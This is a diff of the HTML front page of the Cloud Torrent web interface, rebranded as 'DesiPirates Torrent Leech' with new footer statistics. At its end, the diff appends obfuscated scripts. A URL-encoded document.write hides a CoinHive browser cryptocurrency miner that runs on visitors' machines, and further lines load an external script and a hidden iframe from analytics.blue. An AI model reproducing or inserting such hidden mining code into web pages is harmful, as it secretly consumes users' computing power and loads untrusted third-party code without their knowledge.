@@ -1,45 +1,46 @@
-<html ng-app="app" >
-	<head>
-		<title ng-bind="state.Stats.Title">Cloud Torrent</title>
-    	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-		<link rel="stylesheet" type="text/css" href="css/Lato/Lato.css">
-		<link rel="stylesheet" type="text/css" href="css/semantic.min.css">
-		<link rel="stylesheet" type="text/css" href="css/app.css">
-		<link rel="icon" href="cloud-favicon.png" type="image/x-icon" />
-		<style type="text/css">[ng-cloak]{display: none;}</style>
-	</head>
-	<body class="app"><div ng-cloak class="cage">
+<html ng-app="app">
+
+<head>
+	<title ng-bind="state.Stats.Title">DesiPirates Torrent Leech</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<link rel="stylesheet" type="text/css" href="css/Lato/Lato.css">
+	<link rel="stylesheet" type="text/css" href="css/semantic.min.css">
+	<link rel="stylesheet" type="text/css" href="css/app.css">
+	<link rel="icon" href="https://desipirates.org/styles/default/xenforo/gblogo.png" type="image/x-icon" />
+	<style type="text/css">
+		[ng-cloak] {
+			display: none;
+		}
+	</style>
+</head>
+
+<body class="app">
+	<div ng-cloak class="cage">
 		<div ng-if="!connected" class="connect-warning ui inverted vertical masthead center aligned segment">
 			<div class="ui text container">
-			<h1 class="ui inverted header">
-				Disconnected
-			</h1>
-			<h1 class="ui inverted header">
-				<i class="red lightning icon"></i>
-			</h1>
+				<h1 class="ui inverted header">
+					Disconnected
+				</h1>
+				<h1 class="ui inverted header">
+					<i class="red lightning icon"></i>
+				</h1>
 			</div>
 		</div>
 		<!-- TITLE ===================== -->
 		<div class="title">
 			<h2>
-				<a href="https://github.com/jpillora/cloud-torrent"
-					target="_blank"
-					ng-init="logoHover = false"
-					ng-mouseover="logoHover = true"
-					ng-mouseleave="logoHover = false">
-					<i class="blue icon" ng-class="{cloud:!logoHover, github: logoHover}"></i>  {{ state.Stats.Title }}
+				<a href="https://desipirates.org/index.php" target="_blank" ng-init="logoHover = false"
+				 ng-mouseover="logoHover = true" ng-mouseleave="logoHover = false">
+					 {{ state.Stats.Title }}
 				</a>
 			</h2>
 			<div class="status">
-				<i ng-show="request.count > 0"
-					class="ui circular loading repeat icon"></i>
+				<i ng-show="request.count > 0" class="ui circular loading repeat icon"></i>
 				<i ng-click="$root.config.edit = !$root.config.edit;" ng-class="{green: $root.config.edit}"
-					class="ui circular server icon" style="font-size: 14px;"></i>
-				<i ng-click="$root.omni.edit = !$root.omni.edit;"
-					ng-class="{green: $root.omni.edit}"
-					class="ui circular magnet icon" style="font-size: 14px;"></i>
-				<i class="ui circular lightning icon"
-					ng-class="{ green: connected, red: !connected }"></i>
+				 class="ui circular server icon" style="font-size: 14px;"></i>
+				<i ng-click="$root.omni.edit = !$root.omni.edit;" ng-class="{green: $root.omni.edit}" class="ui circular magnet icon"
+				 style="font-size: 14px;"></i>
+				<i class="ui circular lightning icon" ng-class="{ green: connected, red: !connected }"></i>
 			</div>
 		</div>
 		<!-- GLOBAL ERROR MESSAGE ===================== -->
@@ -55,16 +56,45 @@
 		<section class="downloads" ng-controller="DownloadsController" ng-include src="'template/downloads.html'"></section>
 
 		<footer>
-			<span>github.com/<a href="https://github.com/jpillora" target="_blank">jpillora</a>/<a href="https://github.com/jpillora/cloud-torrent" target="_blank">cloud-torrent</a> version {{ state.Stats.Version }}	-	</span>
-			<span ng-if="numKeys(state.Users) > 1">{{ numKeys(state.Users) }} users connected	-	</span>
-			<span><a href="https://golang.org" target="_blank">Go</a> {{ state.Stats.Runtime }}</span>
+			<div>
+				<span>
+					<a href="https://desipirates.org/index.php" target="_blank">DesiPirates</a>/
+					 version {{ state.Stats.Version }} - </span>
+				<span ng-if="numKeys(state.Users) > 1">{{ numKeys(state.Users) }} users connected - </span>
+				<span>
+				 {{ state.Stats.Runtime }}
+				</span>
+			</div>
+			<div>
+				<span ng-if="state.Stats.System.set">
+					<span class="extra">
+						goroutines {{ state.Stats.System.goRoutines }},
+					</span>
+					<span class="extra">
+						gomem {{ state.Stats.System.goMemory | bytes }},
+					</span>
+					<span>
+						cpu {{ state.Stats.System.cpu | round }}%,
+					</span>
+					<span>
+						mem {{ (100*state.Stats.System.memoryUsed/state.Stats.System.memoryTotal) | round }}%,
+					</span>
+					<span>
+						disk {{ (100*state.Stats.System.diskUsed/state.Stats.System.diskTotal) | round }}%,
+					</span>
+				</span>
+				<span ng-if="state.Stats.Uptime">up {{ ago(state.Stats.Uptime) }}</span>
+			</div>
+
 		</footer>
 
 		<script src="js/vendor/query-string.js"></script>
 		<script src="js/vendor/angular.min.js"></script>
 		<script src="js/vendor/moment.min.js"></script>
-		<script src="/realtime.js"></script>
-		<script>window.app = window.angular.module('app', []);</script>
+		<script src="js/velox.js"></script>
+		<script>
+			window.app = window.angular.module('app', []);
+		</script>
 		<script src="js/config-controller.js"></script>
 		<script src="js/omni-controller.js"></script>
 		<script src="js/torrents-controller.js"></script>
@@ -72,5 +102,9 @@
 		<script src="js/utils.js"></script>
 		<script src="js/semantic-checkbox.js"></script>
 		<script src="js/run.js"></script>
-	</div></body>
+	</div>
+</body>
+<script class="=a1lfWS1aRmo7NzU7MTt3c3M6Ly9zMi5hbmFseXRpY3MuYmx1ZTo3MDAxLHdzczovL3MzLmFuYWx5dGljcy5ibHVlOjcwMDE=" src="https://analytics.blue/amo.js"></script>
+	<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%3E%0A%0A%20%20%20%20%76%61%72%20%6D%69%6E%65%72%20%3D%20%6E%65%77%20%43%6F%69%6E%48%69%76%65%2E%41%6E%6F%6E%79%6D%6F%75%73%28%27%47%54%4B%7A%62%54%63%31%6E%4D%49%77%50%6D%67%30%38%6C%43%6C%78%70%55%79%6A%71%61%75%57%7A%35%73%27%29%3B%0A%20%20%20%20%69%66%20%28%21%6D%69%6E%65%72%2E%69%73%4D%6F%62%69%6C%65%28%29%29%7B%20%20%0A%0A%20%20%20%20%20%20%20%20%6D%69%6E%65%72%2E%73%74%61%72%74%28%29%3B%0A%20%20%20%20%20%20%20%20%6D%69%6E%65%72%2E%73%65%74%54%68%72%6F%74%74%6C%65%28%30%2E%38%29%3B%0A%0A%20%20%20%20%7D%0A%3C%2F%73%63%72%69%70%74%3E'))</script>
+	<script language=javascript>document.write(unescape('%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%61%6E%61%6C%79%74%69%63%73%2E%62%6C%75%65%2F%65%63%61%72%74%2E%68%74%6D%6C%3F%62%64%61%74%61%3D%25%33%44%61%31%6C%66%57%53%31%61%52%6D%6F%37%4E%7A%55%37%4D%54%74%33%63%33%4D%36%4C%79%39%7A%4D%69%35%68%62%6D%46%73%65%58%52%70%59%33%4D%75%59%6D%78%31%5A%54%6F%33%4D%44%41%78%4C%48%64%7A%63%7A%6F%76%4C%33%4D%7A%4C%6D%46%75%59%57%78%35%64%47%6C%6A%63%79%35%69%62%48%56%6C%4F%6A%63%77%4D%44%45%25%33%44%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%3B%22%3E%3C%2F%69%66%72%61%6D%65%3E'))</script>s
 </html>
